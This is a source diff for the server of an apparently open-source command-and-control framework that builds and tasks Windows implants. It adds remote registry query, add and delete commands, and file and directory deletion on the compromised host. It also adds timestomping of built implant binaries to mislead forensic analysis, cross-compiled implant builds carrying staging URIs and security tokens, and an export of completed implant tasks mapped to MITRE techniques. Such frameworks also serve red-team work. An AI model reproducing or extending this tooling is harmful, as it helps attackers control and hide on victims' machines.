@@ -1,28 +1,34 @@
 use std::{
-    fs::{create_dir, create_dir_all},
+    env::current_dir,
+    fs::create_dir_all,
     io,
     path::{Path, PathBuf},
     sync::Arc,
 };
 
 use crate::{
-    FILE_STORE_PATH,
+    DB_EXPORT_PATH, FILE_STORE_PATH,
     app_state::{AppState, DownloadEndpointData},
-    logging::log_error_async,
+    logging::{log_error, log_error_async},
     profiles::get_profile,
+    timestomping::timestomp_binary_compile_date,
 };
 use axum::extract::State;
 use chrono::{SecondsFormat, Utc};
 use serde_json::Value;
 use shared::{
     pretty_print::print_failed,
+    task_types::BuildAllBins,
     tasks::{
-        AdminCommand, BuildAllBins, Command, FileDropMetadata, FileUploadStagingFromClient,
-        NewAgentStaging, StageType, WyrmResult,
+        AdminCommand, Command, DELIM_FILE_DROP_METADATA, FileDropMetadata,
+        FileUploadStagingFromClient, NewAgentStaging, StageType, WyrmResult,
     },
 };
-use shared_c2_client::AgentC2MemoryNotifications;
-use tokio::{fs, io::AsyncReadExt};
+use shared_c2_client::{AgentC2MemoryNotifications, MapToMitre, TaskExport};
+use tokio::{
+    fs,
+    io::{AsyncReadExt, AsyncWriteExt},
+};
 
 /// Main dispatcher for admin commands issued on the server, which may, or may not, include an
 /// implant UID.
@@ -109,6 +115,42 @@ pub async fn admin_dispatch(
             task_agent(Command::Pull, Some(file_path), uid.unwrap(), state).await
         }
         AdminCommand::BuildAllBins(_) => None,
+        AdminCommand::RegQuery(data) => match serde_json::to_string(&data) {
+            Ok(s) => task_agent(Command::RegQuery, Some(s), uid.unwrap(), state).await,
+            Err(e) => {
+                log_error_async(&e.to_string()).await;
+                None
+            }
+        },
+        AdminCommand::RegAdd(data) => match serde_json::to_string(&data) {
+            Ok(s) => task_agent(Command::RegAdd, Some(s), uid.unwrap(), state).await,
+            Err(e) => {
+                log_error_async(&e.to_string()).await;
+                None
+            }
+        },
+        AdminCommand::RegDelete(data) => match serde_json::to_string(&data) {
+            Ok(s) => task_agent(Command::RegDelete, Some(s), uid.unwrap(), state).await,
+            Err(e) => {
+                log_error_async(&e.to_string()).await;
+                None
+            }
+        },
+        AdminCommand::RmFile(data) => match serde_json::to_string(&data) {
+            Ok(s) => task_agent(Command::RmFile, Some(s), uid.unwrap(), state).await,
+            Err(e) => {
+                log_error_async(&e.to_string()).await;
+                None
+            }
+        },
+        AdminCommand::RmDir(data) => match serde_json::to_string(&data) {
+            Ok(s) => task_agent(Command::RmDir, Some(s), uid.unwrap(), state).await,
+            Err(e) => {
+                log_error_async(&e.to_string()).await;
+                None
+            }
+        },
+        AdminCommand::ExportDb => export_completed_tasks_to_json(uid.unwrap(), state).await,
     };
 
     serde_json::to_vec(&result).unwrap()
@@ -215,9 +257,11 @@ pub async fn build_all_bins(
         };
 
         let src_dir = if cfg!(windows) {
-            PathBuf::from(format!("../target/{dir_name}"))
+            PathBuf::from(format!("./implant/target/{dir_name}"))
         } else {
-            PathBuf::from(format!("../target/x86_64-pc-windows-msvc/{dir_name}"))
+            PathBuf::from(format!(
+                "./implant/target/x86_64-pc-windows-msvc/{dir_name}"
+            ))
         };
 
         let out_dir = Path::new(&save_path);
@@ -243,19 +287,16 @@ pub async fn build_all_bins(
 
         // Error check..
         if let Err(e) = tokio::fs::rename(&src, &dest).await {
-            let _ = stage_new_agent_error_printer(
-                &format!(
-                    "Failed to rename built agent, looking for: {}, to rename to: {}. {e}",
-                    src.display(),
-                    dest.display()
-                ),
-                &data.staging_endpoint,
-                state,
-            )
-            .await;
+            let cwd = current_dir().expect("could not get cwd");
+            let msg = format!(
+                "Failed to rename built agent, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
+                src.display(),
+                dest.display()
+            );
+            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
             let _ = remove_dir(&save_path).await?;
 
-            return Err(format!("Failed to rename agent. {e}"));
+            return Err(msg);
         };
 
         //
@@ -271,11 +312,22 @@ pub async fn build_all_bins(
 
             return Err(msg);
         }
+
+        //
+        // If the user profile specifies to timestomp the binary, then try do that - if it fails we do not want to allow
+        // the bad file to be returned to the user.
+        //
+        if let Some(ts) = data.timestomp.as_ref() {
+            if let Err(e) = timestomp_binary_compile_date(ts, &dest).await {
+                let msg = format!("Could not timestomp binary {}, {e}", dest.display());
+                let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
+                let _ = remove_dir(&save_path).await?;
+
+                return Err(msg);
+            }
+        }
     }
 
-    // TODO
-    // - delete the temp directory once we have read the 7z into memory
-    // - return the 7z file as a buffer and have the client serve as a download for the user
     const ZIP_OUTPUT_PATH: &str = "./profiles/tmp.7z";
     let mut cmd = tokio::process::Command::new("7z");
     cmd.args([
@@ -512,6 +564,7 @@ async fn stage_file_upload_from_users_disk(
         useragent: "".into(),
         patch_etw: false,
         jitter: None,
+        timestomp: None,
     };
 
     //
@@ -656,7 +709,11 @@ async fn build_agent(
         Some("x86_64-pc-windows-msvc")
     };
 
-    let mut cmd = tokio::process::Command::new("cargo");
+    let mut cmd = if !cfg!(windows) {
+        tokio::process::Command::new("cargo-xwin")
+    } else {
+        tokio::process::Command::new("cargo")
+    };
 
     let c2_endpoints = data
         .c2_endpoints
@@ -667,7 +724,7 @@ async fn build_agent(
     let jitter = data.jitter.unwrap_or_default();
 
     cmd.env("RUSTUP_TOOLCHAIN", toolchain)
-        .current_dir("../implant")
+        .current_dir("./implant")
         .env("AGENT_NAME", &data.implant_name)
         .env("PE_NAME", pe_name)
         .env("DEF_SLEEP_TIME", data.default_sleep_time.to_string())
@@ -678,10 +735,6 @@ async fn build_agent(
         .env("USERAGENT", &data.useragent)
         .env("STAGING_URI", &data.staging_endpoint)
         .env("SECURITY_TOKEN", &data.agent_security_token);
-
-    if !cfg!(windows) {
-        cmd.arg("xwin");
-    }
 
     cmd.arg("build");
 
@@ -843,6 +896,23 @@ async fn drop_file_handler(
     mut data: FileDropMetadata,
     state: State<Arc<AppState>>,
 ) -> Option<Value> {
+    // check we dont have the delimiter in the input
+    if data.download_name.contains(DELIM_FILE_DROP_METADATA)
+        || data.internal_name.contains(DELIM_FILE_DROP_METADATA)
+        || data
+            .download_uri
+            .as_deref()
+            .unwrap_or_default()
+            .contains(DELIM_FILE_DROP_METADATA)
+    {
+        return Some(
+            serde_json::to_value(WyrmResult::Err::<String>(format!(
+                "Content cannot contain {DELIM_FILE_DROP_METADATA}"
+            )))
+            .unwrap(),
+        );
+    }
+
     //
     // Check whether we actually have that file available on the server.
     // If we do not have the file, we want to return `None` as to not task the agent with downloading a file that doesn't
@@ -863,10 +933,98 @@ async fn drop_file_handler(
     }
 
     if !found {
-        log_error_async(&format!("Could not find staged file when instructing agent to drop a file to disk. Looking for file name: '{}' \
-            but it does not exist in memory.", data.internal_name)).await;
-        return None;
+        let msg = format!(
+            "Could not find staged file when instructing agent to drop a file to disk. Looking for file name: '{}' \
+            but it does not exist in memory.",
+            data.internal_name
+        );
+        log_error_async(&msg).await;
+        return Some(serde_json::to_value(WyrmResult::Err::<String>(msg)).unwrap());
     }
 
     task_agent::<String>(Command::Drop, Some(data.into()), uid.unwrap(), state).await
+}
+
+/// Exports the completed tasks on an agent (by its ID) to a json file in the C2 filesystem
+async fn export_completed_tasks_to_json(uid: String, state: State<Arc<AppState>>) -> Option<Value> {
+    //
+    // This whole block here just unwraps explicitly twice safely through matches trying to get the inner
+    // data. If there was an error or there was no data, this is handled and the function will immediately
+    // return. Using thiserror or using maps may be a little nicer...
+    //
+    let results = match state.db_pool.get_agent_export_data(uid.as_str()).await {
+        Ok(r) => match r {
+            Some(r) => {
+                if r.is_empty() {
+                    let msg = format!("Tasks for implant: {uid} were empty");
+                    log_error(&msg);
+                    return Some(serde_json::to_value(msg).unwrap());
+                }
+
+                r
+            }
+            None => {
+                let msg = format!("Tasks for implant: {uid} were empty");
+                log_error(&msg);
+                return Some(serde_json::to_value(msg).unwrap());
+            }
+        },
+        Err(e) => {
+            let msg = format!(
+                "Error encountered for implant: {uid} when trying to fetch completed tasks. {e}"
+            );
+            log_error(&msg);
+            return Some(serde_json::to_value(msg).unwrap());
+        }
+    };
+
+    // Serialise
+    let mut results_with_mitre: Vec<TaskExport> = Vec::with_capacity(results.len());
+
+    for task in &results {
+        results_with_mitre.push(TaskExport::new(task, task.command.map_to_mitre()));
+    }
+
+    let json_export = serde_json::to_string(&results_with_mitre)
+        .map_err(|e| {
+            let msg = format!("Could not serialise db results for agent: {uid}. {e}");
+            log_error(&msg);
+
+            Some(serde_json::to_value(msg).unwrap())
+        })
+        .unwrap();
+
+    //
+    // Try write the data to the fs
+    //
+    let mut path = PathBuf::from(DB_EXPORT_PATH);
+    path.push(&uid);
+    path.add_extension("json");
+
+    let mut file = tokio::fs::OpenOptions::new()
+        .write(true)
+        .read(true)
+        .create(true)
+        .truncate(true)
+        .open(&path)
+        .await
+        .map_err(|e| {
+            let msg = format!(
+                "Could not create db export file on fs for agent: {uid}. Path: {}, {e}",
+                path.display()
+            );
+            log_error(&msg);
+            Some(serde_json::to_value(msg).unwrap())
+        })
+        .unwrap();
+
+    if let Err(e) = file.write(json_export.as_bytes()).await {
+        log_error(&format!(
+            "Could not write to output file {} for agent: {uid}. {e}",
+            path.display()
+        ));
+        return None;
+    };
+
+    Some(serde_json::to_value(format!("File exported as {uid}")).unwrap())
 }
